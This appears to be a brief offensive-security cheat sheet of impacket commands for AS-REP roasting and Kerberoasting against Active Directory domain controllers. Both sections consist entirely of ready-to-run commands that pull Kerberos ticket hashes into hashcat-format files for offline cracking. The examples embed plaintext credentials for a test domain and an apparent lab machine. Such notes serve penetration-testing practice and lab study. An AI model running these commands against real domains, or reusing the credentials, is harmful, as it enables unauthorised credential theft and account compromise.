# Roasting
## ASREPRoast
```bash
impacket-GetNPUsers -format hashcat -outputfile ASREProastables.txt -dc-ip $KDC_IP -request "$DOMAIN/$USER:$PASSWD"
# impacket-GetNPUsers -format hashcat -outputfile ASREProastables.txt -dc-ip 192.168.68.64 -request 'CONTOSO.ORG/TestAlpha:win10-gui-P@$swd'
# use 'CONTOSO.ORG/' for unauthenticated bind
```

## TGSREPRoast
```bash
# perform kerberoasting without preauth (AS-REQ) (when a user has DONT_REQ_PREAUTH)
impacket-GetUserSPNs -no-preauth "$USER" -usersfile $USERS_FILE -dc-host $KDC_IP $DOMAIN/ -request
# impacket-GetUserSPNs -no-preauth "AltAdmLocal" -usersfile users.txt -dc-host 192.168.68.64 contoso.org/ -request

# perform kerberoasting knowing user's password
impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip $KDC "$DOMAIN/$USER:$PASSWD"
# impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 192.168.68.64 'contoso.org/TestAlpha:win10-gui-P@$swd'


# request a TGS for a single specific kerberoastable user (Ethan, in this case)
impacket-GetUserSPNs -request-user 'ethan' -dc-ip 10.10.11.42 'administrator.htb'/'emily':'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```
